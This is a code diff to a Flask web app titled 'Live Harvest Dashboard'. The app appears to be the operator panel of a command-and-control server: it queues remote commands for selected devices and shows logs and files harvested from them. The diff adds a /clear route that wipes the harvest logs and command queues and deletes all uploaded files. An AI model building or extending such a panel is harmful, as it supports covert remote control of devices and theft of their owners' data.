@@ -16,7 +16,7 @@ def dashboard():
     selected_device = request.values.get('device', devices[0] if devices else None)
 
     # Handle command submission (POST)
-    if request.method == "POST" and selected_device:
+    if request.method == "POST" and selected_device and not request.path.startswith('/clear'):
         cmd = request.form.get('cmd')
         arg = request.form.get('arg')
         device_commands.setdefault(selected_device, []).append((cmd, arg))
@@ -30,6 +30,9 @@ def dashboard():
 
     return render_template_string('''
         <h2>Live Harvest Dashboard</h2>
+        <form method="post" action="/clear" style="margin-bottom:20px;">
+            <button type="submit" style="background:#f22;color:white;padding:6px 16px;border:none;border-radius:4px;">Reset Dashboard (Logs & Files)</button>
+        </form>
         <h3>REMOTE CONTROL COMMAND</h3>
         <form method="post">
             <label>Select device:</label>
@@ -69,6 +72,18 @@ def dashboard():
         {% endfor %}
         </ul>
     ''', devices=devices, selected_device=selected_device, device_logs=device_logs, device_files=device_files)
+
+@app.route('/clear', methods=['POST'])
+def clear_dashboard():
+    harvest_logs.clear()
+    device_commands.clear()
+    # Remove all files in upload folder
+    for fname in os.listdir(UPLOAD_FOLDER):
+        os.remove(os.path.join(UPLOAD_FOLDER, fname))
+    return render_template_string('''
+        <h2>Dashboard and uploaded files cleared!</h2>
+        <a href="/">Back to dashboard</a>
+    ''')
 
 @app.route('/upload', methods=['POST'])
 def upload():
